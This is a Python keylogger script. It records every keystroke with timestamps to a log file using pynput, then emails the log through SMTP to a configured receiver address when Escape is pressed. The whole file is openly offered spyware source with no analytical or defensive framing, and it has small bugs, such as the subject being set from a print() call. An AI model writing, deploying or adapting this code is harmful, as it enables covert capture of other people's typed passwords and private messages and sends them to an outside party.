import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from pynput import keyboard
import config 
import datetime

# Function to log keystrokes
def on_press(key):
    try:
        now = datetime.datetime.now()
        timestamp = now.strftime("%d/%m/%Y, %H:%M:%S")

        with open(config.LOG_FILE_PATH, 'a') as log_file:
            log_file.write(f"{timestamp} - {key.char}\n")
        
        #with open(config.LOG_FILE_PATH, 'a') as log_file:
            #log_file.write(f"{timestamp} - Released: {key}\n")

    except AttributeError:
        with open(config.LOG_FILE_PATH, 'a') as log_file:
            log_file.write(f"{timestamp} - {key}")

def on_release(key):

    if key == keyboard.Key.esc:
        # Stop listener and send the log file if condition is met -> esc. button pressed
        send_log_via_email()
        return False

# Function to send the log file via email
def send_log_via_email():
    with open(config.LOG_FILE_PATH, 'r') as file:
        log_content = file.read()

    now = datetime.datetime.now()
    timestamp = now.strftime("%d/%m/%Y, %H:%M:%S") #time format
    
    #Sending message to receiver
    msg = MIMEMultipart()
    msg['From'] = config.SENDER_EMAIL
    msg['To'] = config.RECEIVER_EMAIL
    msg['Subject'] = print(f"Keylogger Log File at {timestamp}")

    body = MIMEText(log_content, 'plain')
    msg.attach(body)

    try:
        server = smtplib.SMTP(config.SMTP_SERVER, config.SMTP_PORT)
        server.starttls()
        server.login(config.SENDER_EMAIL, config.EMAIL_PASSWORD)
        server.send_message(msg)
        print("Email sent successfully!")
    except Exception as e:
        print(f"Failed to send email: {e}")
    finally:
        server.quit()

# Set up the key listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
